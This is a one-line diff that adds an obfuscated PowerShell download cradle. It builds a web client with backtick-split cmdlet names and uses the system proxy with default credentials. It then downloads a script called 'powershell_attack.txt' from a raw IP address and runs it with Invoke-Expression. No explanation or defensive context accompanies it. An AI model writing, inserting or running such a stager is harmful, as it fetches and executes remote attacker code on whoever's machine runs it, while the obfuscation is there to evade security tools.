@@ -1,0 +1,1 @@
+﻿$M=ne`w-obJ`ECT net.webclient;$M.proxy=[Net.WebRequest]::GetSystemWebProxy();$M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;I`ex $M.downloadstring('http://37.28.154.204/powershell_attack.txt');
